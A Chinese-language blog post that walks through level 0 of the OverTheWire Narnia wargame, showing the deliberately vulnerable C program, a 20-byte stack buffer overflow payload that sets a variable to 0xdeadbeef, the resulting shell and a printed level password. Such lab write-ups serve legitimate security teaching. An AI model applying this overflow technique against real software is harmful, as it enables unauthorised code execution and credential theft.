---
layout: post
title:  "【HackGame】OverTheWireCrypton"
date:   2019-10-02 00:00:00 +0800
categories: security
tags: game
comments: 1
mathjax: true
copyrights: 原创 未完待续
---

https://overthewire.org/wargames/narnia/

每关使用 ssh 连接

```shell
ssh -p 2226 narnia0@narnia.labs.overthewire.org
```

# Level 0–>Level 1

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```

可以看到，有一个大小为 20 的 buf，我们需要通过输入溢出 buf 来覆盖 val 的值。

我们首先做一个简单的尝试：

```shell
$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAABCDE
buf: AAAAAAAAAAAAAAAAAAAABCDE
val: 0x45444342
WAY OFF!!!!
```

值得注意的是，val 的值为 `0x45444342`，即 EDCB。

```shell
/narnia$ python2 -c 'print "A"*20 + "\xef\xbe\xad\xde\x80"'
AAAAAAAAAAAAAAAAAAAAﾭހ
/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: AAAAAAAAAAAAAAAAAAAAﾭހ
buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
$ cat /etc/narnia_pass/narnia1
eaa6AjYMBB
```

